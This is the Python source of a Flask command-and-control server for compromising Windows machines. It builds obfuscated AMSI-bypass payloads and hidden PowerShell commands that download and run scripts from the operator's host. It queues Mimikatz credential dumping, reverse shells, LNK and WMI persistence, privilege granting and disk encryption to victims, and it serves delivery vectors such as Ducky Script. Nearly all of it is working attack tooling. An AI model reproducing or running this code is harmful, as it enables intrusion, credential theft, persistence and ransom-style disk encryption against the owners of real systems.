from flask import Flask, request, render_template, redirect, send_from_directory, make_response
from suggest_lib import Suggested_pass
from multiprocessing import Process
import csv
import glob
import sys
import hashlib
import datetime
import os
import subprocess
import random
import socket
import base64
if  "/.dockerenv" not in glob.glob("/.*"):
    from tkinter.messagebox import *
    from tkinter import *


##### AMSI Bypass

class AmsiBypass:

    def __init__(self):
        self.tech = "moderate"
        self.payload = ""

    def encode_pws(self,chaine):
        return f"Iex([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{base64.b64encode(chaine.encode()).decode()}')))"

    def obfu_one(self,i):
        liste_index = [j for j in range(len(i))]
        random.shuffle(liste_index)
        liste_dispo = ["_" for j in range(1000000)]
        for index,k in enumerate(liste_index):
            liste_dispo[k] = i[index]
        liste_dispo = "".join(liste_dispo).replace("_","")
        chaine = "'"
        for index in liste_index:
            chaine+="{"+str(index)+"}"
        chaine+="' -f "
        for dispo in liste_dispo:
            chaine += "'"+str(dispo)+"'"+","
        chaine = list(chaine)
        chaine.pop(-1)
        chaine = "("+"".join(chaine)+")"
        return chaine

    def obfuscate(self,command_in):
        command_origin = command_in
        command = []
        commands = command_in.split('"')
        for i in commands:
            if "amsi" in i.lower():
                command.append(i)
        dico_to_replace={}
        for i in command:
            chaine = self.obfu_one(i)
            dico_to_replace[i]=chaine
        for i in dico_to_replace.keys():
            if i in command_origin:
                command_origin = command_origin.replace('"'+i+'"',dico_to_replace[i])

        if self.tech.lower() == "strong":
            command = self.encode_pws(command_origin)
            command = command.split("'")
            command[1] = self.obfu_one(command[1])
            return "".join(command)
        elif self.tech.lower() == 'moderate':
            return self.encode_pws(command_origin)
        else:
            return command_origin

    def matt_graeber_one(self):
        method = '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'
        self.payload = method
        return self.obfuscate(method)


    def crash_method(self):
        method = '$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)'
        self.payload = method
        return self.obfuscate(method)

    def random_amsi_bypass(self):
        methods = [self.matt_graeber_one(),self.crash_method()]
        methods_name = ["Matt Graeber One","Crash Method"]
        method = random.choice(methods)
        print(f"Using : {methods_name[methods.index(method)]}")
        to_return = method
        return to_return

    def _execute_cmd_bypamsi(self,cmd):
        amsi_bypass = '$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)'
        return self.random_amsi_bypass()+";"+self.encode_pws(self.obfuscate(cmd))

    def download_and_execute_ps1(self,url):
        payload = self.encode_pws(f'Iex(New-Object Net.WebClient).DownloadString(\'{url}\');')
        payload = "powershell.exe -WindowStyle Hidden -exec bypass -C "+'"'+self._execute_cmd_bypamsi(payload)+'"'
        return payload

##### AMSI BYPASS

def get_status():
    with open("./names/names.txt",'r') as file:
        data = file.read().split("\n")
    return data

def create_csv():
    with open('id_and_commands.csv', mode='w') as csv_file:
        fieldnames = ['id', 'command', 'status']
        writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerow({'id': '0', 'command': 'ls -lah', 'status': 'Active'})

def get_id_command():
    with open('id_and_commands.csv', mode='r') as inp:
        reader = csv.reader(inp)
        return list(reader)[1:]

def remove_doublons():
    all = get_id_command()
    for i in get_id_command():
        while all.count(i)>1:
            all.pop(all.index(i))
    with open('id_and_commands.csv', mode='w') as csv_file:
        fieldnames = ['id', 'command', 'status']
        writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
        writer.writeheader()
        for i in all:
            writer.writerow({'id': i[0], 'command': i[1], 'status': i[2]})

def remove_one(id):
    all = get_id_command()
    all_count = len(all)
    for index,i in enumerate(get_id_command()):
        if i[0] == id:
            all.pop(index)
    with open('id_and_commands.csv', mode='w') as csv_file:
        fieldnames = ['id', 'command', 'status']
        writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
        writer.writeheader()
        for i in all:
            writer.writerow({'id': i[0], 'command': i[1], 'status': i[2]})
    if len(all)==all_count:
        return False
    else:
        return True

def write_command(id,command):
    last_csv = get_id_command()
    to_keep = []
    for elem in last_csv:
        if id not in elem:
            to_keep.append(elem)
    with open('id_and_commands.csv', mode='w') as csv_file:
        fieldnames = ['id', 'command', 'status']
        writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerow({'id': id, 'command': command, 'status': 'Active'})
        for i in to_keep:
            writer.writerow({'id': i[0], 'command': i[1], 'status': i[2]})

def hash(password,username):
    dk = hashlib.pbkdf2_hmac('sha256', bytes(password,'utf-8'), bytes(username,"utf-8"), 100000)
    return dk.hex()

##### Auto Commands

def mimikatz(id):
    print("+-----------+")
    print("|  Mimikatz |")
    print("+-----------+")
    payload = AmsiBypass()
    with open('./commands_templates/mimikatz.txt',"r") as file:
        data = file.read()
    global handler
    global handler_host
    ip = handler
    data = data.replace("%%ip%%",str(ip))
    data = data.replace("%%port%%","1234")
    data = data.replace("%%site%%",str(handler_host))
    with open("./uploads/mimikatz.ps1","w") as file:
        file.write(data)
    payload = payload.download_and_execute_ps1(f"http://{handler_host}/download/?file=mimikatz.ps1")
    with open('./commands_templates/Invoke-Mimikatz.ps1',"r") as file:
        data = file.read()
    with open("./uploads/Invoke-Mimikatz.ps1","w") as file:
        file.write(data)
    with open(f"./queue/{id}.txt","a") as file:
        file.write("\n"+payload)

def shell(id):
    print("+-----------+")
    print("|   Shell   |")
    print("+-----------+")
    payload = AmsiBypass()
    with open('./commands_templates/shell.txt',"r") as file:
        data = file.read()
    global handler
    global handler_host
    ip = handler
    data = data.replace("%%ip%%",str(ip))
    data = data.replace("%%port%%","1234")
    with open("./uploads/payload.ps1","w") as file:
        file.write(data)
    payload = payload.download_and_execute_ps1(f"http://{handler_host}/download/?file=payload.ps1")
    with open(f"./queue/{id}.txt","a") as file:
        file.write("\n"+payload)

def lnk(id):
    print("+--------------------+")
    print("|  Persistence : LNK |")
    print("+--------------------+")
    with open('./commands_templates/lnk_hijacking.py',"r") as file:
        data = file.read()
    with open("./uploads/lnk_hijacking.txt","w") as file:
        file.write(data)
    command = f"MemRunPy:http://{handler_host}/download/?file=lnk_hijacking.txt"
    write_command(id,command)

def grant(id):
    print("+--------------------+")
    print("|       Grant        |")
    print("+--------------------+")
    with open('./commands_templates/grant.py',"r") as file:
        data = file.read()
    with open("./uploads/grant.txt","w") as file:
        file.write(data)
    command = f"MemRunPy:http://{handler_host}/download/?file=grant.txt"
    write_command(id,command)


def wmi(id):
    print("+--------------------+")
    print("|  Persistence : WMI |")
    print("+--------------------+")
    with open('./commands_templates/wmi_persistence.py',"r") as file:
        data = file.read()
    with open("./uploads/wmi_persistence.txt","w") as file:
        file.write(data)
    command = f"MemRunPy:http://{handler_host}/download/?file=wmi_persistence.txt"
    write_command(id,command)

def encrypt_d(id):
    print("+------------------+")
    print("|  Disk Encryption |")
    print("+------------------+")
    with open('./commands_templates/encrypt_disk.py',"r") as file:
        data = file.read()
    with open("./uploads/encrypt_disk.txt","w") as file:
        file.write(data)
    command = f"MemRunPy:http://{handler_host}/download/?file=encrypt_disk.txt"
    write_command(id,command)

def decrypt_d(id):
    print("+------------------+")
    print("|  Disk Decryption |")
    print("+------------------+")
    with open('./commands_templates/decrypt_disk.py',"r") as file:
        data = file.read()
    with open("./uploads/decrypt_disk.txt","w") as file:
        file.write(data)
    command = f"MemRunPy:http://{handler_host}/download/?file=decrypt_disk.txt"
    write_command(id,command)

def pivote():
    print("+-----------+")
    print("|   Pivote  |")
    print("+-----------+")

##### Auto Commands

global admin_cookie
admin_cookie = Suggested_pass(25,25,25)

global admin_hash
admin_hash = "8333f288eed13901e3ff2f249a2d2bb957025942bf3baf3305109cbaedceeb5b"

global admin_usr
admin_usr = "admin"

global host
host1 = "0.0.0.0"

global handler_port
handler_port = "1234"

global handler_host
handler_host = "0.0.0.0"

global commands
commands = []

global token
admin_token = Suggested_pass(10,10,0)
admin_token = admin_token.generate()

global admin_password
admin_password = Suggested_pass(5,5,-1).generate()

global fail_counter
fail_counter = 0
#### Web app

global app
app = Flask(__name__)

global dico_action
dico_action = {1:mimikatz,2:shell,3:lnk,4:pivote,5:wmi,6:encrypt_d,7:decrypt_d,8:grant}


@app.route('/')
def my_form():
    return render_template("index.html")

@app.route(f'/file_upload/{admin_token}', methods=['GET'])
def upload_fil():
    if request.cookies.get("id"):
        global admin_cookie
        if request.cookies.get("id")!=admin_cookie:
            return render_template('file_upload.html',error="Invalid Cookie, Please sign in",token=f"/uploader/{admin_token}")
        return render_template('file_upload.html',token=f"/uploader/{admin_token}",data=glob.glob("./uploads/*.*"))
    else:
        return render_template('file_upload.html',error="Cookie not set, Please sign in",token=f"/uploader/{admin_token}")

@app.route('/uploader/'+admin_token, methods = ['POST'])
def success():
    if request.cookies.get("id"):
        global admin_cookie
        if request.cookies.get("id")!=admin_cookie:
            return render_template("file_upload.html",error="Invalid Cookie, Please Sign in")
        if request.method == 'POST':
            f = request.files['file']
            if f.filename=="":
                return render_template("file_upload.html",error="Choose a file",data=glob.glob("./uploads/*.*"),token=f"/uploader/{admin_token}")
            compteur = 0
            while "./uploads/"+f.filename in glob.glob("./uploads/*.*"):
                compteur +=1
                f.filename = f.filename.split(".")[0]+str(compteur)+"."+f.filename.split(".")[1]
            f.save("./uploads/"+f.filename)
            return render_template("file_upload.html",error="Uploaded",data=glob.glob("./uploads/*.*"),token=f"/uploader/{admin_token}")
    else:
        return render_template("file_upload.html",error="Cookie not set, Please Sign in")

@app.route("/download/",methods=["GET"])
def down():
    if request.args.get('file'):
        if "./uploads/"+request.args.get('file') in glob.glob("./uploads/*.*"):
            return send_from_directory(directory="./uploads/", filename=request.args.get('file'))
        else:
            return ""
    return ""

@app.route(f'/vectors/{admin_token}',methods=["GET","POST"])
def vectors():
    total_vectors = [("Ducky Script :",f'http://{host1}/vectors/{admin_token}?password={admin_password}&type=rubber'),("Basic powershell :",f'http://{host1}/vectors/{admin_token}?password={admin_password}&type=bpsh')]
    if request.method == "GET":
        if request.cookies.get("id")!=admin_cookie:
            return render_template("vectors.html",error_code="Invalid Cookie, Log in")
        if request.args.get("password"):
            if request.args.get("password") != admin_password:
                return render_template("vectors.html",error="Invalid Password",data=total_vectors)
        return render_template("vectors.html",data=total_vectors)

    else:
        global handler_host
        if request.args.get("password"):
            if request.args.get("password") != admin_password:
                return render_template("vectors.html",error="Invalid Password",data=total_vectors)
        if request.args.get("type"):
            type = request.args.get("type")
            try:
                with open(f"./vectors/{type}",'r') as file:
                    data = file.read().replace("%%site%%","https://"+handler_host+"/download/?file=client.exe")
                return data
            except:
                return "innexistant vector"


@app.route("/get_id/")
def get_id():
    with open("id.txt",'r') as file:
        id = int(file.read())
        id += 1
    with open("id.txt","w") as file:
        file.write(str(id))
    if request.args.get("name"):
        name=request.args.get("name")
        with open(f"./names/names.txt","r") as file:
            data=file.read()
        if str(id) not in data:
            with open(f"./names/names.txt","a") as file:
                file.write(f'{id} {name}\n')
    remove_doublons()
    return str(id)

@app.route('/get_command/')
def get_cmd():
    remove_doublons()
    if request.args.get('id'):
        id = request.args.get('id')
        if id in [j[0] for j in get_id_command()]:
            for i in get_id_command():
                if id in i:
                    command = i[1]
            to_keep = []
            last_csv = get_id_command()
            for elem in last_csv:
                if request.args.get('id') not in elem:
                    to_keep.append(elem)
            with open('id_and_commands.csv', mode='w') as csv_file:
                fieldnames = ['id', 'command', 'status']
                writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerow({'id': request.args.get('id'), 'command': '', 'status': 'Active'})
                for i in to_keep:
                    writer.writerow({'id': i[0], 'command': i[1], 'status': i[2]})
            return command
        else:
            last_csv = get_id_command()
            with open('id_and_commands.csv', mode='w') as csv_file:
                fieldnames = ['id', 'command', 'status']
                writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerow({'id': request.args.get('id'), 'command': '', 'status': 'Active'})
                for i in last_csv:
                    writer.writerow({'id': i[0], 'command': i[1], 'status': i[2]})
                return ""
    else:
        return "Sepcify an id"

@app.route("/push_command/")
def push_command():
    if request.args.get('id') and request.args.get('data') and request.args.get('command'):
        with open(f"./data/{request.args.get('id')}",'a') as file:
            file.write(f"WebSh-{request.args.get('id')}-$ {request.args.get('command')}\n{request.args.get('data')}\n\n")
        return "Done !"
    else:
        return "-"

@app.route(f'/get_all_clients/{admin_token}',methods=["GET","POST"])
def get_all():
    content=get_id_command()
    status = get_status()
    lst_status = [i[0] for i in content]
    for i in status:
        if i.split(" ")[0] in lst_status:
            index_lst = lst_status.index(i.split(" ")[0])
            content[index_lst][2] = i.split(" ")[1]


    if request.cookies.get("id"):
        global admin_cookie
        if request.cookies.get("id")!=admin_cookie:
            return render_template("interact.html",content=content,error_code="Invalid Cookie, Log in")
        if request.method == "POST":
            id = request.values.get('id-text')
            if id=="" or id==" ":
                return render_template("interact.html",content=content,error_code="Enter an ID !")
            try:
                if remove_one(id):
                    code = "Done, client removed !"
                else:
                    code = "Unable to locate the client !"
            except:
                code = "Error, unable to remove the client !"
            return render_template("interact.html",content=content,error_code=code)
        else:
            if request.args.get('password'):
                if request.args.get('password') == admin_password:
                    return render_template("interact.html",content=content)
                #return "".join([f"<label>{i[0]}</label><label> {i[1]}</label><label> {i[2]}</label><br/>" for i in get_id_command()])
                else:
                    return render_template("interact.html",content="",error_code="Wrong Password")
            return render_template("interact.html",content="",error_code="Specify a password")
    else:
        return render_template("interact.html",content="",error_code="Invalid Session, please sign in")

@app.route("/queue/", methods=["GET"])
def queue():
    if request.args.get('id'):
        id = request.args.get('id')
        if request.args.get('action'):
            try:
                with open(f"./queue/{id}.txt",'r') as file:
                    data = file.read()
            except:
                with open(f"./queue/{id}.txt",'w') as file:
                    file.write("")
            if request.args.get('action') == "fetch":
                return data
            else:
                data = data.split("\n")
                to_return = data.pop(0)
                with open(f"./queue/{id}.txt",'w') as file:
                    file.write('\n'.join(data))
                return to_return
        else:
            return ""
    else:
        return ""

@app.route(f'/edit_queue/{admin_token}',methods=["GET","POST"])
def edit_queue():
    if request.args.get("password"):
        if request.args.get("password") != admin_password:
            return render_template("edit_queue.html",error="Invalid Password")
        if request.cookies.get("id"):
            global admin_cookie
            if request.cookies.get("id")!=admin_cookie:
                return render_template("edit_queue.html",error="Invalid Cookie, please sign in")
            if request.method == "GET":
                return render_template("edit_queue.html",queue = glob.glob("./queue/*.*"))
            elif request.method == "POST":
                print(request.form.get("auto"))
                if request.form.get("auto") and request.form.get("auto")!=0:
                    action = request.values.get("auto")
                    if not request.values.get("id2"):
                        return render_template("edit_queue.html",error="Set an ID, to use auto commands.")
                    id2 = request.values.get("id2")
                    if action == "0":
                        return render_template("edit_queue.html",error="Invalid auto command.")
                    else:
                        global dico_action
                        dico_action[int(action)](id2)
                        return render_template("edit_queue.html",error="Done !")
                id = request.values.get('id')
                if id == "":
                    return render_template("edit_queue.html",error="Error, set an id.")
                payload = request.values.get('payload')
                with open(f"./queue/{id}.txt",'a') as file:
                    file.write(payload)
                return render_template("edit_queue.html",error="Done !",queue = glob.glob("./queue/*.*"))
        else:
            return render_template("edit_queue.html",error="Invalid Cookie, please sign in")
    else:
        return render_template("edit_queue.html",error="Set a password.")


@app.route("/account/",methods=["GET","POST"])
def account():
    global host1
    global admin_hash
    global admin_password
    global admin_token
    global fail_counter
    global admin_usr
    command_p = f"http://{host1}/command/{admin_token}?password={admin_password}"
    client_p = f"http://{host1}/get_all_clients/{admin_token}?password={admin_password}"
    live_feedb = f"http://{host1}/feedback/{admin_token}?password={admin_password}"
    file_upl = f'http://{host1}/file_upload/{admin_token}?password={admin_password}'
    edit = f'http://{host1}/edit_queue/{admin_token}?password={admin_password}'
    vectors = f'http://{host1}/vectors/{admin_token}?password={admin_password}'
    content = [(command_p,"Command Panel :"),(client_p,"Client Panel :"),(live_feedb,"Live feedback :"),(file_upl,"File Upload :"),(edit,"Edit Queue :"),(vectors,"Attack Vectors :")]
    if fail_counter == 3:
        return render_template("admin.html",error_code=f"Acces Blocked, max attempts excelled.")
    if request.method == "POST":
        user = request.values.get('username')
        password = request.values.get('password')
        if hash(password,user)==admin_hash and user == admin_usr:
            fail_counter = 0
            expire_date = datetime.datetime.now()
            expire_date = expire_date + datetime.timedelta(hours=1)
            global admin_cookie
            admin_cookie = hash(admin_hash,user)+Suggested_pass(5,5,-1).generate()
            print(admin_cookie)
            res = make_response(render_template("links.html",content=content))
            res.set_cookie('id', admin_cookie, expires=expire_date)
            return res
        else:
            fail_counter+=1
            return render_template("admin.html",error_code=f"Access Refused : {fail_counter}/3 attempts.")
    else:
        return render_template("admin.html")

@app.route("/feedback/"+admin_token,methods=["GET","POST"])
def feedback():
    if request.cookies.get("id"):
        global admin_cookie
        if request.cookies.get("id") != admin_cookie:
            return render_template("feedback.html",error="Invalid Cookie, Please Sign in")
        if request.method=="POST":
            if request.args.get('password'):
                if request.args.get('id'):
                    id=request.args.get('id')
                    with open(f"./data/{id}",'r') as file:
                        data = file.read()
                    return render_template("feedback.html",content=data)
                if request.args.get('password') == admin_password:
                    id = request.values.get('id')
                    try:
                        with open(f"./data/{id}",'r') as file:
                            data = file.read()
                    except:
                        return render_template("feedback.html",error="Innexistant session, send a command first.")
                    return render_template("feedback.html",content=data,url="/feedback/"+admin_token+f"?password={admin_password}&id={id}")
                else:
                    return render_template("feedback.html",error="Wrong Password")
            return render_template("feedback.html",error="Please Set a Password")
        else:
            if request.args.get('id'):
                try:
                    with open(f"./data/{request.args.get('id')}",'r') as file:
                        data = file.read()
                except:
                    return render_template("feedback.html",error="Innexistant session, send a command first.")
                return render_template("feedback.html",content=data,url="/feedback/"+admin_token+f"?password={admin_password}&id={request.args.get('id')}")
            else:
                return render_template("feedback.html")
    else:
        return render_template("feedback.html",error="Cookie not set, Please Sign in")


@app.route("/command/"+admin_token,methods=["GET","POST"])
def command_panel():
    if request.cookies.get("id"):
        global admin_cookie
        if request.cookies.get("id") != admin_cookie:
            return render_template("command.html",error="Invalid Cookie, Please Sign in",folder=f'/get_all_clients/{admin_token}?password={admin_password}')
        remove_doublons()
        if request.method =="POST":
            if request.args.get('password'):
                if request.args.get('password')==admin_password:
                    command = request.values.get('command')
                    id = request.values.get('id')
                    if len(command.replace(" ",""))==0 or len(id.replace(" ",""))==0:
                        return render_template("command.html",error="Enter an Id and a command",folder=f'/get_all_clients/{admin_token}?password={admin_password}')
                    if id not in [i[0] for i in get_id_command()]:
                        write_command(id,command)
                    else:
                        last_csv = get_id_command()
                        for index,elem in enumerate(last_csv):
                            if id in elem:
                                last_csv[index][1] = command
                        with open('id_and_commands.csv', mode='w') as csv_file:
                            fieldnames = ['id', 'command', 'status']
                            writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
                            writer.writeheader()
                            for i in last_csv:
                                writer.writerow({'id': i[0], 'command': i[1], 'status': i[2]})
                    return render_template("command.html",error="Added !",folder=f'/get_all_clients/{admin_token}?password={admin_password}')
                else:
                    return render_template("command.html",error="Invalid ID",folder=f'/get_all_clients/{admin_token}?password={admin_password}')
            else:
                return render_template("command.html",error="Please set a password",foler=f'/get_all_clients/{admin_token}?password={admin_password}')
        else:
            return render_template("command.html",folder=f'/get_all_clients/{admin_token}?password={admin_password}')
    else:
        return render_template("command.html",error="Cookie not set, Please Sign in",folder=f'/get_all_clients/{admin_token}?password={admin_password}')

@app.route("/blank/")
def blank():
    return ""

def start_server():
    global app
    app.logger.disabled = True
    app.run(port=80,threaded=True,host="0.0.0.0")

##### TKINTER
def on_closing():
    global root
    root.destroy()
    sys.exit()

def set_ip():
    global root
    host_ip=ip_host.get()
    host_handler = ip_handler.get()
    port = port_handler.get()
    handler1 = revshell_ip.get()
    if handler1 == "":
        handler1 = "127.0.0.1"
    if host_ip == "":
        host_ip = "0.0.0.0"
    if host_handler == "":
        host_handler = "127.0.0.1"
    if port == "":
        port ="1234"
    global handler
    global host1
    global handler_host
    global handler_port
    handler = handler1
    handler_port = port
    handler_host = host_handler
    host1 = host_ip
    root.destroy()


##### TKINTER

try:
    with open("id_and_commands.csv",'r') as file:
        file.read()
except:
    create_csv()

try:
    if  "/.dockerenv" not in glob.glob("/.*"):
        global root
        root = Tk()
        root.title("Launcher")
        root.geometry("500x400")
        ip_host=StringVar()
        ip_handler = StringVar()
        port_handler = StringVar()
        revshell_ip = StringVar()
        label_big = Label(root, text="\nHost Set :", font=("Times New Roman", 35, "bold")).pack()
        label_low = Label(root, text="Set an host (default 0.0.0.0) :").pack()
        ip_ENTRY= Entry(root, textvariable=ip_host).pack()
        label_low2 = Label(root, text="\nSet an host for the site (victim side):").pack()
        ip_ENTRY2= Entry(root, textvariable=ip_handler).pack()
        label_low3 = Label(root, text="\nSet a port for the site (victim side:").pack()
        ip_ENTRY3= Entry(root, textvariable=port_handler).pack()
        label_low4 = Label(root, text="\nSet an ip for the handler:").pack()
        ip_ENTRY4= Entry(root, textvariable=revshell_ip).pack()
        submit = Button(root, text='Set Ip',command=set_ip).pack()

        root.protocol("WM_DELETE_WINDOW", on_closing)
        root.mainloop()
    else:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        host1 = local_ip
        print(f'[-] Inside Docker, Running no tkinter version, host set to {host1}')
except:
    sys.exit()
try:
    with open("id.txt",'r') as file:
        file.read()
except:
    with open("id.txt",'w') as file:
        file.write("0")

web_server = Process(target=start_server)
web_server.start()
